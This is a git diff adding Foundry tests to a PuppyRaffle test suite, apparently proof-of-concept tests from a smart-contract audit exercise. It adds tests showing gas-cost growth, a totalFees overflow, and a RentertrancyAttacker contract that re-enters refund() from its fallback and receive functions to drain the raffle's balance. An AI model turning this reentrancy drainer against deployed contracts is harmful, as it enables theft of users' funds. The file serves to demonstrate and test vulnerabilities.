@@ -196,7 +196,7 @@ contract PuppyRaffleTest is Test {
     }
 
     //////////////////////
-    /// withdrawFees         ///
+    /// withdrawFees   ///
     /////////////////////
     function testCantWithdrawFeesIfPlayersActive() public playersEntered {
         vm.expectRevert("PuppyRaffle: There are currently players active!");
@@ -212,5 +212,123 @@ contract PuppyRaffleTest is Test {
         puppyRaffle.selectWinner();
         puppyRaffle.withdrawFees();
         assertEq(address(feeAddress).balance, expectedPrizeAmount);
+    }
+
+    //////////////////////
+    /// vulnability  ////
+    /////////////////////
+
+    function testDenialOfService() public {
+        vm.txGasPrice(1);
+        uint256 numPlayer =100;
+        address[] memory firstplayers = new address[](numPlayer);
+        for (uint256 i = 0; i < numPlayer; i++) {
+            firstplayers[i] = address(i);
+        }
+        uint256 startgas = gasleft();
+        puppyRaffle.enterRaffle{value: entranceFee*numPlayer}(firstplayers);
+        uint256 endgas = gasleft();
+        uint256 gasUsedfirst = (startgas - endgas)*tx.gasprice;
+        console.log("gasUsedfirst", gasUsedfirst);
+        
+        address[] memory secondplayers = new address[](numPlayer);
+        for (uint256 i = 0; i < numPlayer; i++) {
+            secondplayers[i] = address(i+numPlayer);
+        }
+        startgas = gasleft();
+        puppyRaffle.enterRaffle{value: entranceFee*numPlayer}(secondplayers);
+        endgas = gasleft();
+        uint256 gasUsedsecond = (startgas - endgas)*tx.gasprice;
+        console.log("gasUsedsecond", gasUsedsecond);
+        assert(gasUsedsecond > gasUsedfirst);
+    }
+
+    function testRentrancy() public playersEntered {
+        RentertrancyAttacker attacker = new RentertrancyAttacker(address(puppyRaffle));
+        vm.deal(address(attacker), entranceFee);
+        uint256 startingAttackerBalance = address(attacker).balance;
+        uint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;
+
+        console.log("startingAttackerBalance", startingAttackerBalance);
+        console.log("startingPuppyRaffleBalance", startingPuppyRaffleBalance);
+
+        attacker.attack();
+
+        uint256 endingAttackerBalance = address(attacker).balance;
+        uint256 endingPuppyRaffleBalance = address(puppyRaffle).balance;
+
+        console.log("endingAttackerBalance", endingAttackerBalance);
+        console.log("endingPuppyRaffleBalance", endingPuppyRaffleBalance);
+
+        assertEq(endingAttackerBalance, startingAttackerBalance + startingPuppyRaffleBalance);
+        
+
+    }
+
+    function testTotalFeesCanOverflow() public playersEntered{
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+        puppyRaffle.selectWinner();
+
+        uint256 startingFee = puppyRaffle.totalFees();
+        console.log("startingFee", startingFee);
+
+        uint64 numPlayers = 89;
+        address[] memory players = new address[](numPlayers);
+        for (uint256 i = 0; i < numPlayers; i++) {
+            players[i] = address(i);
+        }
+        puppyRaffle.enterRaffle{value: entranceFee*numPlayers}(players);
+
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+        puppyRaffle.selectWinner();
+
+        uint256 endingFee = puppyRaffle.totalFees();
+        console.log("endingFee", endingFee);
+
+        assert(endingFee < startingFee);
+
+        vm.prank(puppyRaffle.feeAddress());
+        vm.expectRevert("PuppyRaffle: There are currently players active!");
+        puppyRaffle.withdrawFees();
+    }
+    
+
+
+
+
+
+    
+}
+
+contract RentertrancyAttacker{
+    PuppyRaffle puppyRaffle;
+    uint256 entranceFee;
+    uint256 attackerIndex;
+
+    constructor(address _puppyRaffle){
+        puppyRaffle = PuppyRaffle(_puppyRaffle);
+        entranceFee = puppyRaffle.entranceFee();
+    }
+
+    function attack () external payable{
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+        puppyRaffle.refund(attackerIndex);
+    }
+
+    fallback () external payable {
+        if (address(puppyRaffle).balance >= entranceFee) {
+            puppyRaffle.refund(attackerIndex);
+        }
+    }
+
+    receive() external payable {
+        if(address(puppyRaffle).balance >= entranceFee){
+            puppyRaffle.refund(attackerIndex);
+        }
     }
 }
